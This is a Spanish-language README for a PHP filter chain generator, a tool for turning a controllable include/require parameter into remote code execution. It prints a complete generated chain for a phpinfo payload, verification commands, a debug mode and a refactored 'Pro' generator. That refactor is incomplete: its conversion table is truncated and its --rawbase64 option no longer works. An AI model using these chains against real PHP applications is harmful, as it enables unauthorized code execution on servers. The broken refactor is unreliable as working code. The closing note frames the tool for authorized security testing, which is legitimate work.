# PHP Filter Chain Generator

Una interfaz de línea de comandos para generar cadenas de filtros PHP, ¡obtén tu **RCE** sin subir un archivo si controlas completamente el parámetro que se pasa a un `require` o un `include` en PHP!

---

## 📌 **Uso**

### Ayuda
```bash
$ python3 php_filter_chain_generator.py --help
usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]

PHP filter chain generator.

optional arguments:
  -h, --help            show this help message and exit
  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)
  --rawbase64 RAWBASE64
                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.
```

---

## 🔧 **Parámetros**
- **`cadena` (`--chain`)**: Una cadena PHP que deseas inyectar.

---

## 📝 **Ejemplos**

### 1. Generar cadena de filtro para `<?php phpinfo(); ?>`
```bash
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
```
**Salida:**
```
[+] The following gadget chain will generate the following code : <?php phpinfo(); ?>   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

### 2. Verificación del resultado
```bash
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=php://temp');"
```
**Salida:**
```php
<?php phpinfo(); ?>  �@C������>==�@C������>==...
```

---

## 🔍 **Depuración con `rawbase64`**
Para probar un prefijo base64 directamente:
```bash
$ python3 php_filter_chain_generator.py --rawbase64 'cwwwwc'
```
**Salida:**
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|...|/resource=php://temp
```

**Verificación:**
```bash
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|...|/resource=php://temp');"
```
**Salida:**
```
cwwwwcGyQpQw+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+AD0APQ-
```
> ✅ El prefijo base64 es `'cwwwc'` como se esperaba, sin alteraciones.

---

## 🚀 **Mejoras Futuras**
- Acortar cadenas usando **alias más cortos** para los filtros.
- Simplificar cadenas existentes para **reducir su tamaño**.
- Implementar **autocompletado** para los comandos.
- Añadir soporte para **payloads codificados en URL**.

---

## 🧠 **Análisis del Código**
### ✅ **Puntos Fuertes (Nivel Avanzado)**
- **Independencia de archivos**: Usa `php://temp` en lugar de depender de archivos del sistema.
- **Modularidad**: Mapeo de caracteres en el diccionario `conversions` y lógica inversa.
- **Manejo de argumentos**: Uso de `argparse` para una CLI intuitiva.

### 🔧 **Áreas de Mejora (Nivel Pro)**
- **Tipado estático**: Implementar `Type Hinting` (PEP 484).
- **Formateo moderno**: Usar **f-strings** en lugar de `.format()`.
- **Manejo de errores robusto**: Evitar `KeyError` al manejar caracteres no soportados.
- **Arquitectura limpia**: Separar lógica de negocio de la interfaz de consola.

---

## 💡 **Versión Profesional (Pro)**
```python
#!/usr/bin/env python3
"""
PHP Filter Chain Generator (Pro Version).
Refactored for robustness, readability (PEP 8), and type hinting.
Reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
"""

import argparse
import base64
import logging
import sys
from typing import Dict

# Configuración de logs
logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

class PHPFilterGenerator:
    """Clase para la generación de cadenas de filtros PHP."""

    FILE_TO_USE = "php://temp"

    # Diccionario de conversiones (iconv)
    CONVERSIONS: Dict[str, str] = {
        '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
        'C': 'convert.iconv.UTF8.CSISO2022KR',
        '=': ''  # Relleno
        # ... (Resto del diccionario completo)
    }

    @classmethod
    def generate(cls, data: str, debug: bool = False) -> str:
        """Genera el filtro, aplicando transformaciones inversas."""
        filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7"

        for char in reversed(data):
            filters += f"|{cls.CONVERSIONS.get(char, '')}"

        filters += "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7"
        if not debug:
            filters += "|convert.base64-decode"

        return f"php://filter/{filters}/resource={cls.FILE_TO_USE}"

def main() -> None:
    parser = argparse.ArgumentParser(description="Pro PHP Filter Chain Generator")
    parser.add_argument("--chain", help="Payload a codificar")
    parser.add_argument("--rawbase64", help="Testear base64 directo", action="store_true")
    args = parser.parse_args()

    if args.chain:
        # Preprocesamiento: base64 y limpieza de '='
        raw_b64 = base64.b64encode(args.chain.encode()).decode().replace("=", "")
        try:
            payload = PHPFilterGenerator.generate(raw_b64)
            print(f"[+] Payload: {payload}")
        except Exception as e:
            logging.error(f"Error: {e}")

if __name__ == "__main__":
    main()
```

> ⚠️ **Nota**: Usa el código con precaución. Este script está diseñado para **pruebas de seguridad ética** y **entornos controlados**. No lo uses en sistemas sin autorización.
